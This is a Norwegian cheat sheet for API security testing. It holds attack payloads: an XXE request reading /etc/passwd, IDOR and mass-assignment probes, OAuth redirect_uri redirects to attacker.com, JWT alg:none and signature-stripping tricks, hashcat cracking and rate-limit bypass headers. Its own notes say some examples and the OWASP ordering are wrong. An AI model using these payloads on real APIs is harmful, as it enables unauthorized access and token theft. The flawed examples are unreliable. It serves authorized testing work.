# 🔌 Hurtigreferanse for sikkerhetstesting av API-er

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██████╗ ██╗    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
  ██╔══██╗██╔══██╗██║    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
  ███████║██████╔╝██║    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
  ██╔══██║██╔═══╝ ██║    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
  ██║  ██║██║     ██║    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
  ╚═╝  ╚═╝╚═╝     ╚═╝    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
```

<p align="center">
  <img src="https://img.shields.io/badge/API-Security-blue?style=for-the-badge" alt="API">
  <img src="https://img.shields.io/badge/REST-Testing-green?style=for-the-badge" alt="REST">
  <img src="https://img.shields.io/badge/GraphQL-red?style=for-the-badge" alt="GraphQL">
</p>

> **Begreper og rettelser:** Autentisering bekrefter identitet; autorisasjon avgjør tilgang til objekter, egenskaper og funksjoner. Tabellen blander rekkefølgen i [OWASP API Top 10 2023](https://api-security.owasp.org/editions/2023/en/0x00-header/): API6 er sensitive forretningsflyter, API7 SSRF og API8 feilkonfigurasjon. Originalradene er bevart. JWT har separate base64url-deler; hele tokenet dekodes ikke generelt med én Base64-operasjon. Algoritmeforveksling med offentlig nøkkel som HMAC-hemmelighet gjelder normalt at en server som forventer RS256, godtar HS256, motsatt av pilteksten i originalen; se [PortSwigger](https://portswigger.net/web-security/jwt/algorithm-confusion). Claim-endring virker ikke mot korrekt signaturkontroll. XXE-curl mangler mål-URL, JSON-eksemplet inneholder forklarende kommentarer, og feltforslagsspørringen mangler en avsluttende klammeparentes. De ufullstendige eksemplene er bevart.

---

## 📋 Innholdsfortegnelse

- [OWASP API Top 10](#-owasp-api-top-10)
- [Testing av REST-API-er](#-testing-av-rest-api-er)
- [Testing av GraphQL](#-testing-av-graphql)
- [Angrep mot autentisering](#-angrep-mot-autentisering)
- [JWT-angrep](#-jwt-angrep)
- [Vanlige sårbarheter](#-vanlige-sårbarheter)

---

## 🔴 OWASP API Top 10

| # | Sårbarhet | Beskrivelse |
|---|---------------|-------------|
| 1 | **BOLA** | Mangelfull autorisasjon på objektnivå |
| 2 | **Mangelfull autentisering** | Svakheter i autentisering |
| 3 | **BOPLA** | Mangelfull autorisasjon på objektegenskapsnivå |
| 4 | **Ubegrenset ressursforbruk** | Ingen hastighetsbegrensning |
| 5 | **BFLA** | Mangelfull autorisasjon på funksjonsnivå |
| 6 | **SSRF** | Server-Side Request Forgery (forespørsler sendt via serveren) |
| 7 | **Feil sikkerhetskonfigurasjon** | Standardkonfigurasjoner |
| 8 | **Manglende beskyttelse** | Forretningsflyt |
| 9 | **Mangelfull oversikt over ressurser** | Gamle API-er |
| 10 | **Usikker bruk av andre API-er** | Tredjepart |

---

## 🌐 Testing av REST-API-er

### Oppdagelse og kartlegging

```bash
# Finn API-endepunkter
ffuf -u https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Kartlegging av versjoner
/api/v1/users
/api/v2/users
/api/v3/users
/api/beta/users
/api/latest/users

# Vanlige stier
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/swagger/
/openapi.json
/api-docs
/swagger.json
/swagger-ui/
/docs/
```

### Testing av HTTP-metoder

```bash
# Test alle metoder
curl -X GET https://api.target.com/users/1
curl -X POST https://api.target.com/users
curl -X PUT https://api.target.com/users/1
curl -X PATCH https://api.target.com/users/1
curl -X DELETE https://api.target.com/users/1
curl -X OPTIONS https://api.target.com/users

# Overstyring av metode
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://api.target.com/users/1
curl -X POST -H "X-Method-Override: PUT" https://api.target.com/users/1
```

### Endring av parametere

```bash
# BOLA/IDOR
GET /api/users/1      # Din ID
GET /api/users/2      # En annen brukers ID
GET /api/users/0
GET /api/users/-1
GET /api/users/999999

# Parameterforurensning
/api/users?id=1&id=2
/api/users?id[]=1&id[]=2

# Omgåelse med koding
/api/users/1%00
/api/users/1%0a
/api/users/1%2e%2e%2f2
```

### Angrep med Content-Type

```bash
# Endre Content-Type
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/xml
Content-Type: text/plain

# XXE via Content-Type
curl -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>'
```

### Mass assignment (tilordning av ekstra felter)

```bash
# Legg til ekstra felter
POST /api/users
{
  "username": "test",
  "email": "test@test.com",
  "role": "admin",           # Prøv å legge til
  "isAdmin": true,           # Prøv å legge til
  "balance": 99999,          # Prøv å legge til
  "verified": true           # Prøv å legge til
}

# Bruk av tabeller (arrays)
{
  "user": {
    "name": "test",
    "role_ids": [1, 2, 3]
  }
}
```

---

## 📊 Testing av GraphQL

### Introspeksjon

```graphql
# Full introspeksjonsspørring
query {
  __schema {
    types {
      name
      fields {
        name
        args { name }
      }
    }
  }
}

# Enkel introspeksjon
{__schema{types{name,fields{name}}}}

# Hent alle spørringer
{__schema{queryType{fields{name,description}}}}

# Hent alle mutasjoner
{__schema{mutationType{fields{name,description}}}}
```

### Vanlige angrep

```graphql
# IDOR
query { user(id: 2) { email, password } }

# Samling av spørringer (batching)
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
}

# Tjenestenekt med nestede spørringer
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          name
        }
      }
    }
  }
}

# Feltforslag
{ user { a }  # Kan foreslå gyldige felter
```

### SQL-injeksjon i GraphQL

```graphql
# SQLi i argumenter
query { user(name: "' OR '1'='1") { id } }
query { users(filter: "admin'--") { id } }

# NoSQL-injeksjon
query { user(query: "{$gt: ''}") { id } }
```

### Omgåelse av deaktivert introspeksjon

```graphql
# Alternativ introspeksjon
query { __type(name: "User") { fields { name } } }

# Prøv feltnavn fra en ordliste med ffuf
# Bruk en ordliste med vanlige GraphQL-feltnavn
```

---

## 🔐 Angrep mot autentisering

### Testing av API-nøkler

```bash
# Finn API-nøkler
# Undersøk JS-filer, mobilapper og GitHub

# Test nøkkelen på forskjellige steder
curl -H "X-API-Key: KEY" https://api.target.com
curl -H "Authorization: Bearer KEY" https://api.target.com
curl -H "api-key: KEY" https://api.target.com
curl "https://api.target.com?api_key=KEY"
```

### Angrep mot OAuth/OAuth2

```bash
# Tokentyveri via redirect_uri
?redirect_uri=https://attacker.com
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://target.com%40attacker.com
?redirect_uri=https://target.com/callback/../../../attacker

# Omgåelse av state-parameteren
# Fjern state-parameteren
# Bruk samme state for forskjellige brukere

# Tokenlekkasje
# Undersøk Referer-headeren for tokenlekkasje
```

### Økthåndtering

```bash
# Kartlegging av tokener
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Er gamle tokener fortsatt gyldige etter utlogging?
# Problemer med tokenrotasjon
# Gjenbruk av tokener mellom økter
```

---

## 🎫 JWT-angrep

### Dekod JWT

```bash
# Nettbasert: jwt.io
# CLI
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
```

### Algoritmeforveksling

```bash
# Endre alg til none
{
  "alg": "none",
  "typ": "JWT"
}
# Fjern signaturen

# Angrep HS256 → RS256 (se presiseringen)
# Bruk den offentlige nøkkelen som HMAC-hemmelighet
```

### Omgåelse av signaturkontroll

```bash
# Fjern signaturen (behold punktumene)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.

# Prøv en ordliste mot en svak hemmelighet
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Vanlige svake hemmeligheter
secret
password
123456
your-256-bit-secret
```

### Endring av claims (påstander)

```javascript
// Endre brukerens claims
{
  "sub": "1234567890",
  "name": "admin",        // Endre til admin
  "role": "admin",        // Hev rollen
  "admin": true,          // Legg til administratorflagget
  "exp": 9999999999       // Forleng utløpstiden
}
```

### JWT-verktøy

```bash
# jwt_tool
python3 jwt_tool.py <JWT>
python3 jwt_tool.py <JWT> -T    # Endre innhold (tamper)
python3 jwt_tool.py <JWT> -C -d wordlist.txt  # Knekk hemmeligheten

# jwtcrack
./jwtcrack <JWT>
```

---

## 🐛 Vanlige sårbarheter

### Omgåelse av hastighetsbegrensning

```bash
# Headere som kan prøves
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1

# Endre store og små bokstaver
X-FORWARDED-FOR: 127.0.0.1

# Nullbyte
X-Forwarded-For: 127.0.0.1%00

# Forskjellige endepunkter
/api/login
/API/LOGIN
/api/Login
/api/login/
```

### BOLA (mangelfull autorisasjon på objektnivå)

```bash
# Test endring av ID
GET /api/orders/123    # Din bestilling
GET /api/orders/124    # En annen brukers bestilling

# Gjetting av UUID-er
# Se etter forutsigbare mønstre
# Prøv sekvensielle eller tidsbaserte verdier

# ID i forskjellige formater
/api/users/1
/api/users/001
/api/users/user_1
/api/users/0x1
```

### BFLA (mangelfull autorisasjon på funksjonsnivå)

```bash
# Åpne administratorendepunkter som vanlig bruker
GET /api/admin/users
POST /api/admin/config
DELETE /api/admin/user/1

# Basert på HTTP-metode
GET /api/users     # Tillatt
POST /api/users    # Skal bare administrator ha tilgang?
DELETE /api/users  # Skal bare administrator ha tilgang?
```

### Mangelfull oversikt over ressurser

```bash
# Gamle API-versjoner
/api/v1/users    # Kan ha flere sårbarheter
/api/v2/users    # Gjeldende
/api/v3/users    # Beta/ikke utgitt

# Utviklingsendepunkter
/api/debug/
/api/test/
/api/internal/
/api/dev/
```

---

## 🛠️ Verktøy

| Verktøy | Formål |
|------|---------|
| **Burp Suite** | Avskjæring og testing av API-trafikk |
| **Postman** | Utforsking av API-er |
| **Insomnia** | REST-/GraphQL-klient |
| **graphql-voyager** | Visualisering av GraphQL |
| **jwt_tool** | Testing av JWT |
| **Arjun** | Oppdagelse av parametere |

---

## 📚 Ressurser

- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [JWT.io](https://jwt.io/)

---

<p align="center">
  <b>🔌 Sikre API-ene dine!</b><br>
  <i>Bare til autorisert testing!</i>
</p>
